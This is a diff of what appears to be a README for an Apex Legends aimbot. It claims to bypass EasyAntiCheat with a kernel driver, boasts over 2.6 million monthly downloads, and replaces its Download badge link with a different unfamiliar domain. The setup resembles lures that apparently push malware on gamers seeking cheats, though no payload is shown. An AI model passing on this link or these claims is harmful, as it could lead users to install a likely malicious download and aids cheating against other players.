@@ -49,7 +49,7 @@ A: Yes — bypasses EasyAntiCheat with kernel driver.
 
 **Monthly downloads:** 2.6m+
 
-[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/apexaimbot26)
+[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/apexaimbot26)
 
 ---
 
